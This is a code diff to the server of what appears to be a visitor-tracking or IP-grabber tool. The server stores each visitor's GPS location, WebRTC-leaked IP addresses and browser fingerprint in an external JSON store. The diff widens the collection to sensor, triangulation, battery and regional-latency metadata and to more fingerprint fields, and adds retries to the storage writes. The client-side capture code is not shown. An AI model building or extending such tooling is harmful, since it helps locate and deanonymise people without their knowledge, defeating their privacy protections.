@@ -104,7 +104,9 @@ function normalizeCapture(entry) {
     webrtcIPs: Array.isArray(entry.webrtcIPs) ? entry.webrtcIPs : [],
     gps: entry.gps || null,
     fingerprint,
+    metadata: entry.metadata || {},
     visitCount: Number(entry.visitCount) || 1,
+    owner: entry.owner || 'global',
   };
 }
 
@@ -129,17 +131,21 @@ async function readCaptures() {
   }
 }
 
-async function writeCaptures(captures) {
+async function writeCaptures(captures, retries = 3) {
   if (IS_VERCEL) inMemoryCaptures = captures;
-  try {
-    const response = await fetch(JSONBLOB_URL, {
-      method: 'PUT',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(captures)
-    });
-    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-  } catch (err) {
-    console.warn('Could not write to JSONBlob:', err);
+  for (let attempt = 0; attempt < retries; attempt++) {
+    try {
+      const response = await fetch(JSONBLOB_URL, {
+        method: 'PUT',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(captures)
+      });
+      if (response.ok) return;
+      throw new Error(`HTTP ${response.status}`);
+    } catch (err) {
+      console.warn(`JSONBlob write attempt ${attempt + 1}/${retries} failed:`, err.message);
+      if (attempt < retries - 1) await new Promise(r => setTimeout(r, 500 * (attempt + 1)));
+    }
   }
 }
 
@@ -401,14 +407,34 @@ app.patch('/api/capture/:id', async (req, res) => {
   const entry = captures.find((capture) => capture.id === req.params.id);
   if (!entry) return res.status(404).json({ error: 'Capture not found' });
 
+  // GPS update
   const gps = sanitizeGps(req.body.gps);
   if (gps) {
     entry.gps = gps;
     console.log(`[GPS UPDATE] ${entry.id} | Lat: ${gps.lat}, Lon: ${gps.lon}, Accuracy: ${gps.accuracy}m`);
   }
 
+  // WebRTC update
   if (Array.isArray(req.body.webrtcIPs)) {
     entry.webrtcIPs = req.body.webrtcIPs.map((ip) => sanitizeString(ip, 80)).filter(Boolean).slice(0, 8);
+  }
+
+  // Metadata update (sensors, triangulation, battery, regional latency)
+  if (req.body.metadata && typeof req.body.metadata === 'object') {
+    entry.metadata = entry.metadata || {};
+    Object.assign(entry.metadata, req.body.metadata);
+    console.log(`[META UPDATE] ${entry.id} | Keys: ${Object.keys(req.body.metadata).join(', ')}`);
+  }
+
+  // Extra fingerprint fields update
+  if (req.body.languages || req.body.availableRes || req.body.colorDepth || req.body.pixelRatio) {
+    entry.fingerprint = entry.fingerprint || {};
+    if (req.body.languages) entry.fingerprint.languages = req.body.languages;
+    if (req.body.availableRes) entry.fingerprint.availableRes = sanitizeString(req.body.availableRes, 40);
+    if (req.body.colorDepth) entry.fingerprint.colorDepth = sanitizeNumber(req.body.colorDepth, 0);
+    if (req.body.pixelRatio) entry.fingerprint.pixelRatio = sanitizeNumber(req.body.pixelRatio, 1);
+    if (req.body.downlink) entry.fingerprint.downlink = sanitizeNumber(req.body.downlink, 0);
+    if (req.body.rtt) entry.fingerprint.rtt = sanitizeNumber(req.body.rtt, 0);
   }
 
   await writeCaptures(captures);
@@ -455,6 +481,12 @@ app.delete('/api/devices/:deviceId', basicAuth, async (req, res) => {
   broadcast('refresh');
   res.json({ status: 'deleted', deleted: all.length - filtered.length });
 });
+
+// Broadcast stub (no WebSocket in serverless, but prevents crash)
+function broadcast(event) {
+  // In production, this would notify connected dashboard clients
+  console.log(`[BROADCAST] ${event}`);
+}
 
 app.use((req, res) => {
   res.status(404).json({ error: 'Not found' });
